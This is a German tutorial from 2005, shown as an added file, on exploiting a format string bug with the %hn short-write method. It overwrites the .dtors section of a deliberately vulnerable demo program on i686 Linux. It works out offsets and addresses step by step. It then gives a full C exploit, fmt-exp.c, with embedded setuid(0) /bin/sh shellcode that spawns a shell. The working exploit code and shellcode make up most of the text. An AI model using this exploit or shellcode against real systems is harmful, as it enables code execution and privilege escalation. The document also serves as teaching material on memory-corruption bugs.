@@ -1,0 +1,342 @@
+Format String Exploitation
+=============================================================================
+
+Author: posidron <posidron@tripbit.org>
+Date  : 2005/30/05
+
+
+[ Contents ]-----------------------------------------------------------------
+
+0x00 Preamble
+0x01 Environment
+0x02 Example
+0x03 Search Offset
+0x04 Grep .dtors
+0x05 Building Format String
+0x06 Exploit
+
+
+[ Preamble ]-----------------------------------------------------------------
+
+Dieses kleine Howto beschreibt das exploiten eines Format-String Bugs mit der
+short-write Methode (%hn). Dieser Text beschreibt nur im Wesentlichen, um was
+es geht! Denke, Jedem sollte klar sein, warum und welche Funktionen betroffen
+sind. Wichtig sollte sein, das ihr einen Blick in die Manpage von printf
+werft. Ich werde auch nicht auf andere Methoden, wie z.b one-shot, four-byte-write
+oder per-byte-write eingehen. Ich erklaere hier das ueberschreiben der .dtors
+Adresse, fuer das Ausfuehren von unserem Code. Natuerlich gibts noch zig andere
+Optionen, wo man was ueberschreiben koennte, aber diese Methode erschien mir
+die dafuer am Einfachsten.
+
+
+[ Environment ]--------------------------------------------------------------
+
+Operating System : Debian Linux 2.4.29-vs1.2.10
+Architecture     : i686
+Compiler         : gcc 2.95.4
+Debugger         : gdb 2002-04-01-cvs
+Library          : glibc 2.2, libc6
+
+
+[ Example ]------------------------------------------------------------------
+
+Als Demonstration soll uns folgendes kleine Beispiel dienen.
+
+$ cat -n fprintf.c
+ 1  #include <stdio.h>
+ 2  int main (int argc, char **argv) {
+ 3    char buffer[1024];
+ 4    snprintf(buffer, sizeof (buffer), "buf:%s\n", argv[1]);
+ 5    fprintf(stderr, buffer);
+ 6  }
+
+Wollen wir uns nun das Programm etwas genauer anschauen.
+
+$ gcc fprintf.c -o fprintf
+$ ./fprintf hallo
+buf:hallo
+$
+
+Das Programm macht soweit alles nach Wunsch, schaut man sich nun die Zeile 5
+mal genauer an, so sieht man das die Funktion keine Formatierungszeichen
+enthaelt und ein Buffer, der durch 'User-Input' gefaellt wird, direkt auf
+stderr 'geparst' wird. Dies waere nichts Anderes, als wuerde man die Funktion
+z.b so schreiben.
+
+fprintf(stderr, "%x")
+
+
+
+[ Search Offset ]------------------------------------------------------------
+
+Ok, wollen wir nun mit dem Format-Zeichen '%p' ein paar bytes
+vom stack 'popen'.
+
+$ ./fprintf %p
+buf:0x80484f4
+
+$ ./fprintf '%p %p %p %p %p'
+buf:0x80484f4 0xbffffe99 0xbffff968 0x40013664 0x3a667562
+gotfault $
+
+$ ./fprintf 'AAAA%p %p %p %p %p %p'
+buf:AAAA0x80484f4 0xbffffe99 0xbffff968 0x40013664 0x3a667562 0x41414141
+
+Wie wir sehen, haben wir unseren Buffer erreicht, den wir am Anfang mit AAAA
+(41414141) gefaellt haben. Als Feature wird uns das Formatierungszeichen $ von
+der printf Funktion geliefert, womit wir direkt zu dem gewuenschten Argument
+springen koennen.
+
+$ ./fprintf 'AAAA%6$p'
+buf:AAAA0x41414141
+
+Dabei erkennt man, dass 6 der Offset zu unserem Buffer. Weiter gehts erstmal,
+indem wir uns einen Platz in diesem Binary suchen, wo wir unsere Shellcode
+Adresse platzieren koennen. Da wir hier keinen Buffer ueberschreiben koennen und
+auch somit schlecht den EIP, nehmen wir uns die 'destruction table' (dtors).
+
+
+[ Grep .dtors ]--------------------------------------------------------------
+
+So wie erwaehnt 'greppen' wir uns nun die .dtors Sektion aus dem Binary-file.
+Dazu gibts viele Methoden, ich liste hier mal die zwei einfachsten Methoden #
+auf:
+
+1. Methode
+----------
+$ objdump -s -j .dtors ./fprintf
+
+./fprintf:     file format elf32-i386
+
+Contents of section .dtors:
+ 80495e0 ffffffff 00000000                    ........
+
+2. Methode
+----------
+$ objdump -h ./fmt | grep dtors
+ 18 .dtors      00000008  080495e0  080495e0  000005e0  2**2
+
+Hier sieht man, beginnend an der Addresse 0x80495e0, die .dtors Section. Wir
+muessen nun 4 Bytes dazu addieren, um unseren Shellcode dort platzieren zu koennen.
+
+  0x80495e0
++ 0x4
+-----------
+= 0x80495e4
+
+Die Addresse 0x80495e4 zeigt nun auf 0x0000000, auf einen leeren Platz
+sozusagen.
+
+Da wir mit der 'Short-Write' Methode arbeiten, also 2 Bytes jeweils schreiben
+wollen, addieren wir nun noch 2 Bytes auf diese Addresse.
+
+  0x80495e4
++ 0x2
+-----------
+= 0x80495e6
+
+Danach konvertieren wir diese beiden Adressen, die wir soeben ausgerechnet
+haben nach 'Little Endian', da wir auf einer IA32 arbeiten.
+
+\xe4\x95\x04\x08 \xe6\x95\x04\x08
+
+
+[ Build Format String ]------------------------------------------------------
+
+Da wir spaeter die Shellcode Adresse im Exploit automatisch berechnen lassen,
+gebe ich hier mal eine Beispiel Adresse an, um zu zeigen, wie der fertige
+Format String spaeter aussehen koennte.
+
+Als Shellcode Adresse nehmen wir:
+
+0xbfffffc1
+
+Da wir, wie schon gesagt nach der 'Short-Write' Methode arbeiten, teilen wir
+diese Adresse nun in jeweils 4 bytes auf (low und high).
+
+ffc1 - der 'low' Teil
+bfff - der 'high' Teil
+
+ffc1 = 65473 Dezimal
+bfff = 49151 Dezimal
+
+Da wir in unserer snprintf Funktion im Source Code noch "buf:" stehen haben,
+muessen wir zu den 8 Bytes noch 4 Bytes addieren, also insgesammt 12. Also 8
+Bytes, fuer unsere ganze Adresse und 4 Bytes als Laenge von dem String "buf:".
+
+  65473
+-    12
+-------
+= 65461
+
+Da bfff kleiner ist als ffd1, machen wir einen sogenannten rollover.
+
+1bfff = 114687 Dezimal
+
+  114687
+-  65473
+--------
+=  49214
+
+Wir koennen nun mit unserem dtors Address String, unseren fertigen Format
+String bauen.
+
+\xe4\x95\x04\x08 \xe6\x95\x04\x08 %.49214u %6 $hn %.65461u %7 $hn
+
+Wir gehen als erstes zu der Adresse mit \xe4\ 'popen' dort 49214*4 bytes
+bis bfff. Danach machen wir das Gleiche an der Adresse mit \xe6\, wo wir
+65461*4 bytes bis ffc1 'popen'. Danach sollte unser EIP auf unsere gewuenschte
+Shellcode Adresse verweisen. Also lasst uns ein Exploit coden, was dies
+automatisch generiert.
+
+
+[ Exploit ]------------------------------------------------------------------
+
+Bauen wir uns nun ein fertiges Exploit fuer unser 'buggy' Programm, hab es mal
+ein wenig kommentiert, werde aber am Ende noch mal genau darauf eingehen, was
+alles dort passiert.
+
+$ cat -n fmt-exp.c
+   1  /* fmt-exp.c, written by posidron */
+   2  #include <stdio.h>
+   3  #include <stdlib.h>
+   4  #include <string.h>
+   5  #include <unistd.h>
+   6
+   7  /* change this by your needs */
+   8  #define BINARY  "../per_byte_write/fprintf"
+   9  #define OBJDUMP "/usr/bin/objdump"
+  10  #define GREP    "/bin/grep"
+  11
+  12  /* my linux x86 setuid(0) bytecode (32 bytes) */
+  13  char shell[] = "\x31\xc0\x31\xdb\xb0\x17\xcd\x80" // <- setuid(0), not
+  14                 "\x31\xc0\x50\x68\x2f\x2f\x73\x68" // needed for this..
+  15                 "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
+  16                 "\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+  17
+  18  int main (int argc, char **argv) {
+  19    FILE *fd;
+  20    int r;
+  21    char *arg[3], *env[2];
+  22    char  payload[512], tmp[128];
+  23    unsigned int offset, dtors;
+  24    unsigned int retaddr, high, low;
+  25
+  26    if (argc != 2) {
+  27      printf("%s <offset>\n", argv[0]);
+  28      return -1;
+  29    }
+  30
+  31    /* set pop offset */
+  32    offset = atoi(argv[1]);
+  33
+  34    /* calculate the address of the bytecode in the env */
+  35    retaddr = 0xbffffffa - strlen(BINARY) - strlen(shell);
+  36
+  37    /* grep the .dtors address */
+  38    snprintf(tmp, sizeof (tmp), "%s -s -j .dtors %s | %s ffffffff",
+  39      OBJDUMP, BINARY, GREP);
+  40
+  41    fd = popen(tmp, "r");
+  42
+  43    if (fd == NULL) {
+  44      printf("error: unable to grep .dtors address!\n");
+  45      return -2;
+  46    }
+  47
+  48    r = fscanf(fd, " %08x", &dtors);
+  49
+  50    if (r == -1) {
+  51      pclose(fd);
+  52      printf("error: can't find .dtors address!\n");
+  53      return -3;
+  54    }
+  55    pclose(fd);
+  56
+  57    printf("{-} .dtors     : 0x0%x\n", dtors);
+  58    dtors += 4;
+  59    printf("{-} .dtors + 4 : 0x0%0x\n", dtors);
+  60    printf("{-} &shell     : 0x%x\n", retaddr);
+  61
+  62    /* cut the addr into 4 low and high bytes */
+  63    high = (retaddr & 0xffff0000) >> 16;
+  64     low = (retaddr & 0x0000ffff);
+  65
+  66    printf("{-} high bytes : 0x%x (%d) at offset %d\n",
+  67      high, high, offset+1);
+  68    printf("{-} low  bytes : 0x%x (%d) at offset %d\n",
+  69      low, low, offset);
+  70
+  71    memset(payload, '\0', sizeof(payload));
+  72    memset(tmp, '\0', sizeof(tmp));
+  73
+  74    /* convert the two dtors addresses to little endian */
+  75    payload[0] = (dtors & 0x000000ff) >>  0;
+  76    payload[1] = (dtors & 0x0000ff00) >>  8;
+  77    payload[2] = (dtors & 0x00ff0000) >> 16;
+  78    payload[3] = (dtors & 0xff000000) >> 24;
+  79    dtors += 2;
+  80    payload[4] = (dtors & 0x000000ff) >>  0;
+  81    payload[5] = (dtors & 0x0000ff00) >>  8;
+  82    payload[6] = (dtors & 0x00ff0000) >> 16;
+  83    payload[7] = (dtors & 0xff000000) >> 24;
+  84
+  85    /* build the format string */
+  86    high = 0x1bfff - low;
+  87    low = low - 12;
+  88
+  89    sprintf(tmp, "%%.%uu%%%d$hn"
+  90                 "%%.%uu%%%d$hn",
+  91                 low,  offset,
+  92                 high, offset + 1);
+  93
+  94
+  95    /* build the whole payload */
+  96    memcpy(payload + 8, tmp, strlen(tmp));
+  97    payload[strlen(payload) + 1] = '\0'; // :p
+  98
+  99    /* set the binary arguments */
+ 100    arg[0] = BINARY;
+ 101    arg[1] = payload;
+ 102    arg[2] = NULL;
+ 103
+ 104    /* put the bytecode into env */
+ 105    env[0] = shell;
+ 106    env[1] = NULL;
+ 107
+ 108    /* execute this shit :> */
+ 109    execve(arg[0], arg, env);
+ 110
+ 111    return -4;
+ 112  }
+
+$ gcc fmt-exp.c -o fmt-exp
+$ ./fmt-exp 6
+{-} .dtors     : 0x080495e0
+{-} .dtors + 4 : 0x080495e4
+{-} &shell     : 0xbfffffc1
+{-} high bytes : 0xbfff (49151) at offset 7
+{-} low  bytes : 0xffc1 (65473) at offset 6
+00000000000000000000000000000000000000000000000000000000000000000000000000000
+0000000000000000000000000000000000000000000000[...]00000000000000003221225374
+sh-2.05a$
+
+
+Kurz zusammengefasst, macht das Exploit nichts anderes, als das, was wir
+vorher manuell gemacht haben.
+Als Erstes lassen wir uns die Shellcode Adresse berechnen, dann 'greppen' wir
+die .dtors Adresse, addieren sie um 4 Bytes. Danach schneiden wir unsere
+Shellcode Adresse in zwei Teile low und high, anschliessend konvertieren wir
+die gefundene .dtors Adresse nach 'Little Endian' und addieren 2 Bytes,
+konvertieren sie dann ebenso. Folgend berechnen wir unsere 'pops', die wir
+benoetigen, um zur Shellcode Adresse zu springen. Das alles packen wir in
+'payload' und geben es als 'command line' Argument an. Zusaetzlich packen wir
+unseren Shellcode in ein 'array' und fuehren dann alles mit execve aus. execve()
+schiebt unseren Shellcode dann in die 'env' und die payload faehrt uns dort hin.
+
+Beachtet, das die Offset Adressen natuerlich bei euch evtl. anders sind als
+bei mir.
+
+So das wars, hoffe es hat euch ein wenig weitergeholfen und habt mein
+Geschriebenes halbwegs verstanden. Falls Fragen sind, mailt mir ruhig oder
+fragt im ircs.
